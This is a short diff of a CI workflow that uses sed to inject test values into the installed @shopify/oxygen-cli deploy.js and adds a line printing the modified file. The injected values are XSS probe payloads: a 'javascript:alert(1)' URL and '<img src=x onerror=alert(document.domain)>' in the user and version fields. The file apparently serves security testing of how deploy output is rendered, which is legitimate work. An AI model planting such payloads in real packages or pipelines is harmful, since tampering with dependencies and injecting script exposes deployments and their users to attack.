@@ -50,6 +50,7 @@ jobs:
           sed -i "135i\url: \"javascript:alert(1)\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
           sed -i "136i\user: \"<img src=x onerror=alert(document.domain)>\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
           sed -i "137i\version: \"<img src=x onerror=alert(document.domain)>\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
+          cat node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
 
       - name: Check Oxygen version
         id: check_version
